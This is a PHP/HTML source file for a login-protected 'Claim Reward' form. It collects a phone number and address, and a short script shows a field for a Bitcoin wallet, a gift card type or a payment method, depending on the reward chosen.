<?php include "config.php"; ?>

<?php
if (!isset($_SESSION['user'])) {
    header("Location: login.php");
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
* {
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

body {
    margin: 0;
    background: #f4f6f9;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

/* Card Container */
.container {
    background: #fff;
    padding: 25px;
    border-radius: 10px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.1);
}

/* Title */
h2 {
    margin-bottom: 20px;
}

/* Inputs */
input, select {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border: 1px solid #ccc;
    border-radius: 6px;
    transition: 0.3s;
}

input:focus, select:focus {
    border-color: #007bff;
    outline: none;
}

/* Button */
button {
    width: 100%;
    padding: 12px;
    background: #007bff;
    border: none;
    color: #fff;
    font-size: 16px;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    background: #0056b3;
}

/* Responsive */
@media (max-width: 500px) {
    .container {
        margin: 10px;
        padding: 20px;
    }

    h2 {
        font-size: 20px;
    }
}
</style>

</head>
<body>

<div class="container">

<h2>🎁 Claim Reward</h2>

<form method="POST" action="process_claim.php">

<input type="text" name="phone" placeholder="Phone Number" required>
<input type="text" name="address" placeholder="Address" required>

<select name="reward_type" id="rewardType" onchange="showFields()" required>
<option value="">Select Reward</option>
<option value="bitcoin">Bitcoin</option>
<option value="giftcard">Gift Card</option>
<option value="money">Money</option>
</select>

<!-- Bitcoin -->
<div id="btc" style="display:none;">
<input type="text" name="wallet" placeholder="Bitcoin Wallet Address">
</div>

<!-- Giftcard -->
<div id="gift" style="display:none;">
<input type="text" name="giftcard_type" placeholder="Gift Card Type (e.g Amazon)">
</div>

<!-- Money -->
<div id="money" style="display:none;">
<select name="method">
<option value="">Select Payment Method</option>
<option value="bank">Bank Transfer</option>
<option value="cashapp">CashApp</option>
<option value="paypal">PayPal</option>
<option value="zelle">Zelle</option>
</select>
</div>

<button type="submit">Submit Claim</button>

</form>

</div>

<script>
function showFields(){
    let type = document.getElementById("rewardType").value;

    document.getElementById("btc").style.display="none";
    document.getElementById("gift").style.display="none";
    document.getElementById("money").style.display="none";

    if(type==="bitcoin") document.getElementById("btc").style.display="block";
    if(type==="giftcard") document.getElementById("gift").style.display="block";
    if(type==="money") document.getElementById("money").style.display="block";
}
</script>

</body>
</html>